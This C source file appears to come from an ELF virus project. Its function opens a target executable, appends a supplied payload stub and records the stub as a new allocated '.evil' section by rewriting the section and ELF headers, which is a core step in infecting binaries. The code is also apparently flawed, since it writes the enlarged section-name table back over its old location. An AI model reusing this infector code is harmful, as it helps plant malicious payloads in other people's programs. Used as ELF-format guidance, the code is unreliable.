#include "../include/death.h"

#define NEW_SECTION_NAME ".evil"

ElfClass detect_section_evil(FILE *f) 
{
	unsigned char ident[EI_NIDENT];
	ElfClass cls = {0};
	fseek(f, 0, SEEK_SET);
	if (fread(ident, 1, EI_NIDENT, f) != EI_NIDENT)
		return (cls);
	if (ident[EI_CLASS] == ELFCLASS32)
		cls.is32 = 1;
	if (ident[EI_CLASS] == ELFCLASS64) 
		cls.is64 = 1;
	return cls;
}

int add_evil_section(char *path, unsigned char *stub, size_t stub_len) 
{
	FILE *f = fopen(path, "r+b");
	if (!f) 
		return -1;
	ElfClass cls = detect_section_evil(f);
	if (!cls.is32 && !cls.is64) 
	{
		fclose(f);
		return -1;
	}
	if (cls.is32) 
	{
		Elf32_Ehdr eh;
		fseek(f, 0, SEEK_SET);
		fread(&eh, 1, sizeof(eh), f);
		fseek(f, eh.e_shoff, SEEK_SET);
		Elf32_Shdr *shdr = malloc(eh.e_shnum * sizeof(Elf32_Shdr));
		fread(shdr, sizeof(Elf32_Shdr), eh.e_shnum, f);
		Elf32_Shdr shstr = shdr[eh.e_shstrndx];
		char *shstrtab = malloc(shstr.sh_size);
		fseek(f, shstr.sh_offset, SEEK_SET);
		fread(shstrtab, 1, shstr.sh_size, f);
		size_t new_name_off = shstr.sh_size;
		size_t new_shstr_size = shstr.sh_size + strlen(NEW_SECTION_NAME) + 1;
		shstrtab = realloc(shstrtab, new_shstr_size);
		memcpy(shstrtab + new_name_off, NEW_SECTION_NAME, strlen(NEW_SECTION_NAME) + 1);
		shstr.sh_size = new_shstr_size;
		shdr[eh.e_shstrndx] = shstr;
		fseek(f, 0, SEEK_END);
		Elf32_Off stub_off = ftell(f);
		fwrite(stub, 1, stub_len, f);
		Elf32_Shdr newsec = {0};
		newsec.sh_name = new_name_off;
		newsec.sh_type = SHT_PROGBITS;
		newsec.sh_flags = SHF_ALLOC;
		newsec.sh_offset = stub_off;
		newsec.sh_size = stub_len;
		newsec.sh_addralign = 0x10;
		size_t new_shnum = eh.e_shnum + 1;
		Elf32_Shdr *new_shdr = malloc(new_shnum * sizeof(Elf32_Shdr));
		memcpy(new_shdr, shdr, eh.e_shnum * sizeof(Elf32_Shdr));
		memcpy(&new_shdr[eh.e_shnum], &newsec, sizeof(newsec));
		fseek(f, shstr.sh_offset, SEEK_SET);
		fwrite(shstrtab, 1, new_shstr_size, f);
		fseek(f, 0, SEEK_END);
		Elf32_Off new_shoff = ftell(f);
		fwrite(new_shdr, sizeof(Elf32_Shdr), new_shnum, f);
		eh.e_shoff = new_shoff;
		eh.e_shnum = new_shnum;
		fseek(f, 0, SEEK_SET);
		fwrite(&eh, 1, sizeof(eh), f);
		free(shdr);
		free(shstrtab);
		free(new_shdr);
		fclose(f);
		return 0;
	}
	if (cls.is64) 
	{
		Elf64_Ehdr eh;
		fseek(f, 0, SEEK_SET);
		fread(&eh, 1, sizeof(eh), f);
		fseek(f, eh.e_shoff, SEEK_SET);
		Elf64_Shdr *shdr = malloc(eh.e_shnum * sizeof(Elf64_Shdr));
		fread(shdr, sizeof(Elf64_Shdr), eh.e_shnum, f);
		Elf64_Shdr shstr = shdr[eh.e_shstrndx];
		char *shstrtab = malloc(shstr.sh_size);
		fseek(f, shstr.sh_offset, SEEK_SET);
		fread(shstrtab, 1, shstr.sh_size, f);
		size_t new_name_off = shstr.sh_size;
		size_t new_shstr_size = shstr.sh_size + strlen(NEW_SECTION_NAME) + 1;
		shstrtab = realloc(shstrtab, new_shstr_size);
		memcpy(shstrtab + new_name_off, NEW_SECTION_NAME, strlen(NEW_SECTION_NAME) + 1);
		shstr.sh_size = new_shstr_size;
		shdr[eh.e_shstrndx] = shstr;
		fseek(f, 0, SEEK_END);
		Elf64_Off stub_off = ftell(f);
		fwrite(stub, 1, stub_len, f);
		Elf64_Shdr newsec = {0};
		newsec.sh_name = new_name_off;
		newsec.sh_type = SHT_PROGBITS;
		newsec.sh_flags = SHF_ALLOC;
		newsec.sh_offset = stub_off;
		newsec.sh_size = stub_len;
		newsec.sh_addralign = 0x10;
		size_t new_shnum = eh.e_shnum + 1;
		Elf64_Shdr *new_shdr = malloc(new_shnum * sizeof(Elf64_Shdr));
		memcpy(new_shdr, shdr, eh.e_shnum * sizeof(Elf64_Shdr));
		memcpy(&new_shdr[eh.e_shnum], &newsec, sizeof(newsec));
		fseek(f, shstr.sh_offset, SEEK_SET);
		fwrite(shstrtab, 1, new_shstr_size, f);
		fseek(f, 0, SEEK_END);
		Elf64_Off new_shoff = ftell(f);
		fwrite(new_shdr, sizeof(Elf64_Shdr), new_shnum, f);
		eh.e_shoff = new_shoff;
		eh.e_shnum = new_shnum;
		fseek(f, 0, SEEK_SET);
		fwrite(&eh, 1, sizeof(eh), f);
		free(shdr);
		free(shstrtab);
		free(new_shdr);
		fclose(f);
		return 0;
	}
	fclose(f);
	return (-1);
}
